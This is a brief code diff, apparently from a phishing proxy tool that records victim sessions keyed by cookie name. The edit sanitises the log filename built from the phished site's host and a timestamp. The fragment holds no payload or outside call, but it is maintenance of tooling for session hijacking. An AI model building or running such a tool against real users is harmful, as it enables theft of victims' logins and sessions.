-    VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}`;
+    VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host.replace(/[^a-zA-Z0-9.-]/g, '_')}_${new Date().toISOString().replace(/[:.]/g, '_')}`;
     VICTIM_SESSIONS[cookieName].createdAt = new Date().toISOString();
     VICTIM_SESSIONS[cookieName].targetService = {
         protocol: phishedURL.protocol,
